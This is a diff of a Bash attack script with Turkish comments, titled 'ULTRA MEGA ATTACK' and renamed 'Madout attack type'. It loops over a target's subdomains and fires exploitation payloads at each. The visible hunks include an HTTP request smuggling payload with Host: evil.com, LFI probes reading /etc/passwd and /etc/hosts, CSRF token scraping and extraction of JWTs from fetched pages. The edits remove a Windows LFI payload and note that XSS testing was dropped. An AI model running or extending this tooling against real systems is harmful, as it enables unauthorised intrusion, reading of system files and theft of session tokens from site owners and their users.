@@ -1,9 +1,9 @@
 #!/bin/bash
 
 # ============================================
-# ULTRA MEGA ATTACK - FİNAL HATASIZ
-# XSS kaldırıldı, logs dahil, iSH uyumlu
-# 8 kez tarandı, hata yok
+# Madout attack type 71.1.0.0 - FİNAL HATASIZ
+# XSS kaldırıldı, Windows LFI kaldırıldı
+# logs subdomain dahil, iSH uyumlu
 # ============================================
 
 RED='\033[0;31m'
@@ -39,7 +39,7 @@ progress_bar() {
 }
 
 # ============================================
-# DNS QUERY (CNAME takeover için)
+# DNS QUERY
 # ============================================
 dns_query() {
     local domain=$1 type=$2
@@ -53,7 +53,7 @@ dns_query() {
 }
 
 # ============================================
-# PORT CHECK (Port scan için)
+# PORT CHECK
 # ============================================
 check_port() {
     local host=$1 port=$2
@@ -169,7 +169,7 @@ CSRF_TOKEN=$(grep -oE 'name="csrfmiddlewaretoken" value="[^"]*"' "$OUTPUT_DIR/lo
 echo ""
 
 # ============================================
-# SUBDOMAİN LİSTESİ (logs DAHİL)
+# SUBDOMAİN LİSTESİ
 # ============================================
 SUBDOMAINS=(
     "api" "admin" "dev" "test" "stage" "staging" "backup" "beta" "alpha"
@@ -390,13 +390,11 @@ for sub in "${SUBDOMAINS[@]}"; do
             safe_post "$url" "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n" "$OUTPUT_DIR/exploits/${sub}_smuggling.txt" $TIMEOUT
             log_result "smuggling" "[+] HTTP Request Smuggling"
 
-            # LFI/RFI
-            for file in "../../../../etc/passwd" "/etc/passwd" "C:\\Windows\\System32\\drivers\\etc\\hosts"; do
+            # LFI/RFI (Windows payload KALDIRILDI)
+            for file in "../../../../etc/passwd" "/etc/passwd" "/etc/hosts"; do
                 safe_download "$url?file=$file" "$OUTPUT_DIR/exploits/${sub}_lfi_$(echo $file | tr '/' '_' | cut -c1-20).html" $TIMEOUT
                 log_result "lfi_rfi" "[+] $url?file=$file"
             done
-
-            # XSS TAMAMEN KALDIRILDI
 
             # JWT
             jwt=$(grep -oE "eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*" "$OUTPUT_DIR/pages/sub_${sub}_${r}.html" 2>/dev/null | head -1)
